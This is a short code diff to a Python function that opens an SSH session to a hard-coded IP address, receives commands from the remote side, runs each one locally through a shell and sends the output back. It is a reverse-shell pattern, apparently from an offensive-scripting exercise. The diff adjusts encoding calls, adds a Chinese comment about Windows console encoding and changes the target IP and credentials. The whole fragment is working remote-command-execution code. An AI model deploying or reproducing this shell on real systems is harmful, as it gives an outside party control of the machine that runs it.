@@ -9,16 +9,17 @@ def ssh_command(ip, user, passwd, command):
     client.connect(ip, username=user, password=passwd)
     ssh_session = client.get_transport().open_session()
     if ssh_session.active:
-        ssh_session.send(str.encode(command))
-        print(bytes.decode(ssh_session.recv(1024)))
+        ssh_session.send(command.encode())
+        print(ssh_session.recv(1024).decode())
         while True:
-            command = bytes.decode(ssh_session.recv(1024))
+            command = ssh_session.recv(1024).decode()
             try:
+                #windows下先使用chcp 65001将控制台编码格式转为utf-8
                 cmd_output = subprocess.check_output(command, shell=True)
                 ssh_session.send(cmd_output)
             except Exception as e:
-                ssh_session.send(bytes.decode(str(e)))
+                ssh_session.send(str(e).encode())
         client.close()
     return
 
-ssh_command('192.186.6.129','pi','pi','ClientConnected')
+ssh_command('172.18.18.88','','','ClientConnected')
